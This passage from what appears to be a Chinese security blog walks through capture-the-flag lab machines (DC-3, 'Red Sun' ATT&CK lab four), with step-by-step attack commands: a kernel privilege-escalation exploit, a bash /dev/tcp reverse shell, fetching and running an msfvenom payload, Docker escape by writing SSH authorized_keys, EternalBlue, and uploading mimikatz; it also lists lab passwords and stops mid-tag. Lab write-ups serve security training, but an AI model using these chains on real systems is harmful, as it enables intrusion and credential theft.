title="三、linux提权"></a>三、linux提权</h3><h3 id="1-确定操作系统信息"><a href="#1-确定操作系统信息" class="headerlink" title="1. 确定操作系统信息"></a>1. 确定操作系统信息</h3><p>这儿不能用suid和git提权，得换种方法，先查看操作系统版本信息可参考</p><p><a href="https://blog.csdn.net/guo_qiangqiang/article/details/106925996">查看Linux当前操作系统版本信息常用命令</a> ，以寻找提权漏洞突破口</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tac /etc/issue</span><br></pre></td></tr></table></figure><img src="/2024/01/23/DC2%20&%20DC3/image-20230729162032081.png" alt="image-20230729162032081" style="zoom:50%;"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /proc/version</span><br></pre></td></tr></table></figure><img src="/2024/01/23/DC2%20&%20DC3/image-20230729162157108.png" alt="image-20230729162157108" style="zoom:50%;"><h4 id="2-搜索操作系统漏洞"><a href="#2-搜索操作系统漏洞" class="headerlink" title="2. 搜索操作系统漏洞"></a>2. 搜索操作系统漏洞</h4><p>继续使用searchsploit工具搜索漏洞 ，打开另一个终端</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit Ubuntu 16.04</span><br></pre></td></tr></table></figure><img src="/2024/01/23/DC2%20&%20DC3/image-20230729163239951.png" alt="image-20230729163239951" style="zoom:50%;"><p>privilege escalat 就是提权，这里我们使用通用4.4.x版本的提权方式</p><p>查看完整path</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit -p linux/local/39772.txt</span><br></pre></td></tr></table></figure><img src="/2024/01/23/DC2%20&%20DC3/image-20230729163425681.png" alt="image-20230729163425681" style="zoom:50%;"><p>完整path为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/share/exploitdb/exploits/linux/local/39772.txt</span><br></pre></td></tr></table></figure><p>将漏洞详细信息cp到桌面</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp /usr/share/exploitdb/exploits/linux/local/39772.txt /home/bamboo/桌面/39772.txt</span><br></pre></td></tr></table></figure><img src="/2024/01/23/DC2%20&%20DC3/image-20230729164004281.png" alt="image-20230729164004281" style="zoom:67%;"><p>在这个文件里面可以看到漏洞的详细信息，最后两行是exp连接，访问就能下载</p><h4 id="3-利用exp提权"><a href="#3-利用exp提权" class="headerlink" title="3. 利用exp提权"></a>3. 利用exp提权</h4><p>接着我们下载该压缩包并放到kali桌面里，<strong>解压该文件</strong>，然后在桌面开启http服务，将下载好的文件导入到DC-3靶机</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 1111</span><br></pre></td></tr></table></figure><p>这里记住要在桌面上打开</p><img src="/2024/01/23/DC2%20&%20DC3/image-20230729165647733.png" alt="image-20230729165647733" style="zoom:50%;"><p>出现这个说明成功</p><img src="/2024/01/23/DC2%20&%20DC3/image-20230729172146055.png" alt="image-20230729172146055" style="zoom:50%;"><p>exp地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.85.128:1111/39772//exploit.tar</span><br></pre></td></tr></table></figure><p>回到我们的虚拟终端，利用wget命令下载该工具</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://192.168.85.128:1111/39772/exploit.tar</span><br></pre></td></tr></table></figure><img src="/2024/01/23/DC2%20&%20DC3/image-20230729172538330.png" alt="image-20230729172538330" style="zoom:50%;"><p>下载完后用tar命令解压该压缩包</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -xvf exploit.tar</span><br></pre></td></tr></table></figure><p> 接着cd进入解压后的文件夹</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> ebpf_mapfd_doubleput_exploit</span><br></pre></td></tr></table></figure><img src="/2024/01/23/DC2%20&%20DC3/image-20230729172940431.png" alt="image-20230729172940431" style="zoom:50%;"><p>根据之前的文本文件里面的记载，执行下两个文件，（Linux系统下.（点）是执行某个文件的意思）</p><img src="/2024/01/23/DC2%20&%20DC3/image-20230729173453192.png" alt="image-20230729173453192" style="zoom:70%;"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./compile.sh</span><br><span class="line">./doubleput</span><br></pre></td></tr></table></figure><img src="/2024/01/23/DC2%20&%20DC3/image-20230729173856735.png" alt="image-20230729173856735" style="zoom:60%;"><p>可以看到我们拿到了root权限，但是只有60秒</p><h4 id="4-找查flag"><a href="#4-找查flag" class="headerlink" title="4. 找查flag"></a>4. 找查flag</h4><p>接着用find命令找查flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -name *flag*</span><br></pre></td></tr></table></figure><p>发现一个the-flag的文件很可疑，tac命令打开该文件</p><img src="/2024/01/23/DC2%20&%20DC3/image-20230729174358967.png" alt="image-20230729174358967" style="zoom:50%;"><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">tac</span> /root/the-flag.txt</span><br></pre></td></tr></table></figure><img src="/2024/01/23/DC2%20&%20DC3/image-20230729174459879.png" alt="image-20230729174459879" style="zoom:50%;"><p>芜湖~拿到flag</p>]]></content>
      
      
      <categories>
          
          <category> 渗透打靶 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>红日靶场四</title>
      <link href="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%9B%9B/"/>
      <url>/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%9B%9B/</url>
      
        <content type="html"><![CDATA[<h2 id="ATT-CK红队评估四"><a href="#ATT-CK红队评估四" class="headerlink" title="ATT&amp;CK红队评估四"></a>ATT&amp;CK红队评估四</h2><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>首先添加两张网卡，<code>VMnet0: 192.168.157.0 </code>    <code> VMnet1: 192.168.183.0</code>      </p><img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%9B%9B/image-20230910114834980.png" alt="image-20230910114834980" style="zoom:67%;"><h4 id="web"><a href="#web" class="headerlink" title="web"></a>web</h4><p>两张网卡<strong>VMnet0</strong> <strong>VMnet1</strong></p><img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%9B%9B/image-20230910115939949.png" alt="image-20230910115939949"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">用户名密码：ubuntu:ubuntu</span><br></pre></td></tr></table></figure><p>需手动开启ubuntu的docker环境，对应的端口服务如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">cd /home/ubuntu/Desktop/vulhub/struts2/s2-045</span><br><span class="line">sudo docker-compose up -d</span><br><span class="line">cd /home/ubuntu/Desktop/vulhub/tomcat/CVE-2017-12615/</span><br><span class="line">sudo docker-compose up -d</span><br><span class="line">cd /home/ubuntu/Desktop/vulhub/phpmyadmin/CVE-2018-12613/</span><br><span class="line">sudo docker-compose up -d</span><br></pre></td></tr></table></figure><h4 id="DC"><a href="#DC" class="headerlink" title="DC"></a>DC</h4><p>一张网卡<strong>VMnet1</strong></p><img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%9B%9B/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%9B%9B/image-20230910120116886.png" class title="image-20230910120116886"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">用户名密码：administrator:Test2008</span><br><span class="line">修改后：administrator:Test2023</span><br></pre></td></tr></table></figure><h4 id="win7"><a href="#win7" class="headerlink" title="win7"></a>win7</h4><p>一张网卡<strong>VMnet1</strong></p><img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%9B%9B/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%9B%9B/image-20230910120238373.png" class title="image-20230910120238373"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">用户名密码：douser:Dotest123</span><br></pre></td></tr></table></figure><table><thead><tr><th align="left">主机</th><th>外网IP</th><th>内网IP</th></tr></thead><tbody><tr><td align="left">kali</td><td>192.168.111.128</td><td>无</td></tr><tr><td align="left">web</td><td>192.168.111.129</td><td>192.168.183.129</td></tr><tr><td align="left">DC</td><td>无</td><td>192.168.183.130</td></tr><tr><td align="left">win7</td><td>无</td><td>192.168.183.134</td></tr></tbody></table><h3 id="一、信息搜集"><a href="#一、信息搜集" class="headerlink" title="一、信息搜集"></a>一、信息搜集</h3><h4 id="探测目标IP"><a href="#探测目标IP" class="headerlink" title="探测目标IP"></a>探测目标IP</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arp-scan -l</span><br></pre></td></tr></table></figure><img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%9B%9B/image-20230911161840445.png" alt="image-20230911161840445" style="zoom:67%;"><p>发现<strong>192.168.111.129</strong></p><h4 id="探测开放端口"><a href="#探测开放端口" class="headerlink" title="探测开放端口"></a>探测开放端口</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sS -T4 192.168.111.129</span><br></pre></td></tr></table></figure><img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%9B%9B/image-20230911163144925.png" alt="image-20230911163144925" style="zoom:67%;"><h4 id="web端信息搜集"><a href="#web端信息搜集" class="headerlink" title="web端信息搜集"></a>web端信息搜集</h4><h5 id="Struts2"><a href="#Struts2" class="headerlink" title="Struts2"></a>Struts2</h5><p>访问<strong>192.168.111.129:2001</strong></p><p>是一个<strong>java</strong>编写的<strong>Struts2</strong>的页面</p><img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%9B%9B/image-20230911164028487.png" alt="image-20230911164028487" style="zoom:80%;"><p>直接用工具扫描 <a href="https://www.cnsrc.org.cn/threatassessment/1694.html#J_DLIPPCont">Struts2全版本漏洞检测工具</a></p><img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%9B%9B/image-20230911170245253.png" alt="image-20230911170245253" style="zoom: 60%;"><p>扫描发现存在漏洞</p><p>可以执行命令，发现有docker</p><img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%9B%9B/image-20230911170745496.png" alt="image-20230911170745496" style="zoom:60%;"><p>可以写入反弹shell的命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &amp;&gt;/dev/tcp/192.168.111.128/8888 &lt;&amp;1</span><br></pre></td></tr></table></figure><img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%9B%9B/image-20230911171537568.png" alt="image-20230911171537568" style="zoom:67%;"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -al /</span><br></pre></td></tr></table></figure><img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%9B%9B/image-20230911171634868.png" alt="image-20230911171634868" style="zoom:67%;"><p>进行查看时也能查看是否存在 dockerrnv 文件。此时确定是在docker中，因此需要进行docker逃逸</p><p>不会<strong>docker</strong>逃逸，网上很多wp都说不能逃逸成功，就没有再尝试</p><h5 id="Tomcat-任意文件上传"><a href="#Tomcat-任意文件上传" class="headerlink" title="Tomcat 任意文件上传"></a>Tomcat 任意文件上传</h5><p><strong>2002</strong>端口是一个<strong>apache tomcat 8.5.19</strong></p><img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%9B%9B/image-20230911173236564.png" alt="image-20230911173236564" style="zoom:80%;"><p>搜索一下版本漏洞</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit tomcat 8.5.19</span><br></pre></td></tr></table></figure><img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%9B%9B/image-20230911193641927.png" alt="image-20230911193641927" style="zoom:67%;"><p>发现该版本存在<strong>CVE-2017-12617</strong>漏洞，这个漏洞<strong>CVE- 2017-12615</strong>是<strong>Tomcat</strong>远程代码执行漏洞(PUT请求)，可以使用<strong>PUT</strong>方法上传任意文件</p><p>将<strong>poc</strong>复制出来</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit -m /exploit/jsp/webapps/42966.py</span><br></pre></td></tr></table></figure><img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%9B%9B/image-20230911194801242.png" alt="image-20230911194801242" style="zoom:67%;"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python 42966.py -u http://192.168.111.129:2002/</span><br></pre></td></tr></table></figure><img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%9B%9B/image-20230911195255492.png" alt="image-20230911195255492" style="zoom:67%;"><p>漏洞存在，可以打一个shell回来</p><img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%9B%9B/image-20230911201107302.png" alt="image-20230911201107302" style="zoom:67%;"><p>因为是linux，所以需要生成linux的木马，在kali本地起一个http服务方便靶机下载</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.111.128 LPORT=4444 -f elf &gt; shell.elf</span><br></pre></td></tr></table></figure><img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%9B%9B/image-20230911201504742.png" alt="image-20230911201504742" style="zoom:67%;"><p>在桌面开启<strong>http</strong>服务</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m http.server 8888</span><br></pre></td></tr></table></figure><img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%9B%9B/image-20230911201627183.png" alt="image-20230911201627183" style="zoom:67%;"><p>下载shell.elf并赋权执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget http://192.168.111.128:8888/shell.elf</span><br><span class="line">chmod 777 shell.elf</span><br><span class="line">./shell.elf</span><br></pre></td></tr></table></figure><img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%9B%9B/image-20230911202852055.png" alt="image-20230911202852055" style="zoom:67%;"><p><strong>msf</strong>上线</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload linux/x86/meterpreter/reverse_tcp</span><br><span class="line">set lhost 192.168.111.128</span><br><span class="line">set lport 4444</span><br><span class="line">run</span><br></pre></td></tr></table></figure><img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%9B%9B/image-20230911203025950.png" alt="image-20230911203025950" style="zoom:67%;"><p>上线成功</p><h3 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h3><h4 id="docker逃逸"><a href="#docker逃逸" class="headerlink" title="docker逃逸"></a>docker逃逸</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig</span><br></pre></td></tr></table></figure><p>可以看到有eth0、eth1分别处于1.0&#x2F;24和183.0&#x2F;24两个网段，初步判断是有域环境的。</p><img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%9B%9B/image-20230911203338849.png" alt="image-20230911203338849" style="zoom:67%;"><p>继续往下看，还有几个<strong>ip</strong>，但是不是eth，而且这里有三个<strong>ip</strong>，根据上面有三个不同的环境，那么可以判断应该是用的<strong>docker</strong>。那么我们无论使用3个环境的哪个环境拿shell都只是一个<strong>docker</strong>容器里面的<strong>shell</strong>，并不是真正<strong>ubuntu</strong>的shell，所以这里我们还需要进行<strong>docker逃逸</strong>到<strong>ubuntu</strong></p><h4 id="privileged特权模式逃逸"><a href="#privileged特权模式逃逸" class="headerlink" title="privileged特权模式逃逸"></a>privileged特权模式逃逸</h4><p>docker中提供了一个<code>--privileged</code>参数，这个参数本身最初的目的是为了提供在docker中运行docker的能力<br><a href="https://www.docker.com/blog/docker-can-now-run-within-docker/">https://www.docker.com/blog/docker-can-now-run-within-docker/</a></p><p>docker文档中对这个参数的解释如下<br><a href="https://docs.docker.com/engine/reference/run/#runtime-privilege-and-linux-capabilities">https://docs.docker.com/engine/reference/run/#runtime-privilege-and-linux-capabilities</a></p><blockquote><p>当操作员执行时docker run –privileged，Docker将启用对主机上所有设备的访问，并在<code>AppArmor</code>或<code>SELinux</code>中进行一些配置，以允许容器对主机的访问几乎与在主机上容器外部运行的进程相同。</p></blockquote><p>当控制使用特权模式启动的容器时，docker管理员可通过mount命令将外部宿主机磁盘设备挂载进容器内部，获取对整个宿主机的文件读写权限，此外还可以通过写入计划任务等方式在宿主机执行命令。那么这里就可以尝试使用特权模式写入<strong>ssh</strong>私钥，使用<strong>ssh</strong>免密登录</p><p>这里首先新建一个<strong>tmptest</strong>文件夹，用来存放挂载后的<strong>docker</strong></p><p>查看一下<strong>dev文</strong>件夹里面的设备文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mkdir /tmptest</span><br><span class="line">ls /dev</span><br></pre></td></tr></table></figure><img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%9B%9B/image-20230911205654903.png" alt="image-20230911205654903" style="zoom:67%;"><p>可以看到有四个sda设备文件，我这里选择sda1进行挂载，使用mount命令将sda1挂载到tmptest文件夹里并用ls指令进行查看</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mount /dev/sda1 /tmptest</span><br><span class="line">ls /tmptest</span><br></pre></td></tr></table></figure><img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%9B%9B/image-20230912161003889.png" alt="image-20230912161003889" style="zoom:67%;"><p>然后使用ssh生成一个名叫tmp的私钥，然后用chmod命令赋予权限</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -f tmp</span><br><span class="line">chmod 600 tmp</span><br><span class="line">cat tmp.pub</span><br></pre></td></tr></table></figure><img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%9B%9B/image-20230912161458737.png" alt="image-20230912161458737" style="zoom:67%;"><p>因为我们之前已经把sda1挂载成功了，那么我们如果要访问ubuntu的&#x2F;home目录，我们直接访问挂载到的tmptest文件夹的&#x2F;home文件夹即可，即&#x2F;tmptest&#x2F;home路径</p><img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%9B%9B/image-20230912161607236.png" alt="image-20230912161607236" style="zoom:67%;"><p>使用<code>ls -alh</code>查看当前目录下包括隐藏文件在内的所有文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -alh /tmptest/home/ubuntu</span><br></pre></td></tr></table></figure><img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%9B%9B/image-20230912161713782.png" alt="image-20230912161713782" style="zoom:67%;"><p>这里我们看到了一个<code>.ssh</code>文件，我们要将<strong>ssh</strong>私钥写入到<code>.ssh</code>目录里面并将文件命名为<code>authorized_keys</code>（目标机<code>.ssh</code>目录权限必须为<strong>700</strong>）</p><p>使用如下命令写入ssh私钥</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">cp -avx /tmptest/home/ubuntu/.ssh/id_rsa.pub /tmptest/home/ubuntu/.ssh/authorized_keys </span><br><span class="line"></span><br><span class="line">echo &#x27;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCd5VN+GxFBMKzMzvTAmb0lrVgJ8I5WPuyz7mhAgjNK0j/WrvfAPn/rTKhJZFguxBV+8azP9T/r/grA0upCalbF8hF3NONCYtjSWyPqmgXaqwauK3NIHGdiUtIq7vMZ2j16aMh13WesrJhPku/tCuaqysksEWSm4OYJgOEnfas+jtlLVC33fBiDs294Uea3M5Gpr1qsw2wNer3PVe2ZeNvdEdGnBb2P/GX+ur2Lsjal6QMlbLQLMtgzWkZQID07asPpE30dR5q9Cat58KUMsj9C9jjKWVdNaOM0Zs4TlVVSIH6qj/taVcaJ5xVXzWqdF67sBl0hZSYD2SyHRe7n+gXYZhf53Wll3U/TmedaRD7svvXHmx+VdxU/tGPK2hReUMKWxg+qnH8K4JLe8WgbpU9tnYaHrtxEttwGZrYzGd0hEdl0U2cLIoo2mKy01BQynHuLmOZc1TzA/VMfs/OwIhva0KrBdvkQTc609Fzzq71o1fP5GjrOp56n5fssoerGABE= root@kali</span><br><span class="line">&#x27; &gt; /tmptest/home/ubuntu/.ssh/authorized_keys</span><br><span class="line"></span><br><span class="line">echo &#x27;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDDORcKgiXbVHiYu4CdE4KVZRKXZ/HAoowMB72vNdtT4VVzpbRnTlL/k0WfxntR8vowfAqlbM0nSZlXcwFKX+muzJxp0Pu+Wpax+TGDU1vDusdPvhYGPsohRBDpTWpWuPXAF65TnRNInhp7e+RAQ65yDweKl2Xs5qV82eI2TtGLxJ7hTPyTW3t1VGs3HV2BK0Krbv72BUEafY7AfID80wMGXiBLmuFiAL4mc7RhpirkDhcG8rwXvKQCS8JWF/8XjXOwUVCA70BCK5D51MD4qDBW7CwMJmhwO/e3aEzrqnpDkk6o9Ae2ef9VAvS5fGphSmnLvxzTbCnhq6cvGWzqNsxJoTmZPNQv7lxKN1wi02Ru9mlZPAR/futl4xJcaC4h99fFa6Ig8rJo8ZjXyNHu2R3oWC42FooMZANYzw2EOh2DR432LkwS5fxpoaKvzuli9ujjBXnD3x7e0LWMBya92Qz8VnGgjQdbADhpLNoo0qWK9Jt0leun51z5jCasvWlsCAs= root@kali&#x27; &gt; /tmptest/home/ubuntu/.ssh/authorized_keys</span><br></pre></td></tr></table></figure><p>然后再使用ssh连接ubuntu即可，到此我们才真正意义上拿到了ubuntu的webshell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -i tmptest ubuntu@192.168.111.129</span><br></pre></td></tr></table></figure><img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%9B%9B/image-20230913161148243.png" alt="image-20230913161148243" style="zoom:67%;"><p>拿到<strong>Ubuntu</strong>真正的<strong>shell</strong></p><h4 id="上线msf"><a href="#上线msf" class="headerlink" title="上线msf"></a>上线msf</h4><p>之前的方法上线<strong>msf</strong></p><img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%9B%9B/image-20230913161828915.png" alt="image-20230913161828915" style="zoom:67%;"><h4 id="内网存活探测"><a href="#内网存活探测" class="headerlink" title="内网存活探测"></a>内网存活探测</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">route add 192.168.111 255.255.255.0 1</span><br><span class="line">route print</span><br><span class="line">use auxiliary/server/socks_proxy</span><br><span class="line">set version 4a</span><br><span class="line">run</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi /etc/proxychains4.conf</span><br></pre></td></tr></table></figure><img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%9B%9B/image-20230913172548660.png" alt="image-20230913172548660" style="zoom:67%;"><img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%9B%9B/image-20230913173239577.png" alt="image-20230913173239577" style="zoom:67%;"><p>这里使用kali里面的<code>udp_probe</code>模块，速度较快</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/discovery/udp_probe</span><br><span class="line">set rhosts 192.168.183.1-255</span><br><span class="line">set threads 20</span><br><span class="line">run</span><br></pre></td></tr></table></figure><img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%9B%9B/image-20230913173453848.png" alt="image-20230913173453848" style="zoom:67%;"><p>探测到<code>192.168.183.130</code>和<code>192.168.183.134</code>两台机器，这里注意到130开了一个53端口，这里初步判断130为域控</p><h4 id="永恒之蓝尝试"><a href="#永恒之蓝尝试" class="headerlink" title="永恒之蓝尝试"></a>永恒之蓝尝试</h4><p>这里直接上手永恒之蓝先打一波，这里实战的话最好先扫描，因为直接打的话可能会打蓝屏，这里是靶场的原因我就直接上手打了。之前提到过<strong>130</strong>开了<strong>53</strong>端口初步判断为域控，所以这里先从<strong>134</strong>这台主机入手</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/smb/ms17_010_eternalblue</span><br><span class="line">set payload windows/x64/meterpreter/bind_tcp</span><br><span class="line">set rhosts 192.168.183.134</span><br><span class="line">run</span><br></pre></td></tr></table></figure><img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%9B%9B/image-20230913200923005.png" alt="image-20230913200923005" style="zoom:67%;"><p>只前一直上线不了，后面尝试就成功了。不知道为什么，几台机器的IP一直在变，现在打进去的<strong>172</strong>是<strong>win7</strong></p><img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%9B%9B/image-20230921132419316.png" alt="image-20230921132419316" style="zoom:67%;"><p>拿到的shell是一个<strong>system</strong>权限，看到wp上说要进行一个进程迁移，迁移到<strong>x64</strong>的进程上去，但是我寻思这个就是x64的进程啊,所以就没有移</p><p>然后开启一个windows环境下的cmd进行信息搜集</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">chcp 65001     将控制台的代码页更改为 UTF-8 字符集,可以确保控制台能够正确地处理和显示 UTF-8 编码的文本信息</span><br><span class="line">net user</span><br><span class="line">net view /domain</span><br></pre></td></tr></table></figure><p>可以看到这里是在DEMO这个域环境里面</p><img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%9B%9B/image-20230921133356182.png" alt="image-20230921133356182" style="zoom:67%;"><p>ping一下130，能够ping通</p><img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%9B%9B/image-20230921133538954.png" alt="image-20230921133538954" style="zoom:67%;"><h4 id="获取密码"><a href="#获取密码" class="headerlink" title="获取密码"></a>获取密码</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">upload /home/bamboo/桌面/mimikatz-master/x64/ C:\\</span><br></pre></td></tr></table></figure><p>将<code>mimikatz</code>上传到靶机上</p><img 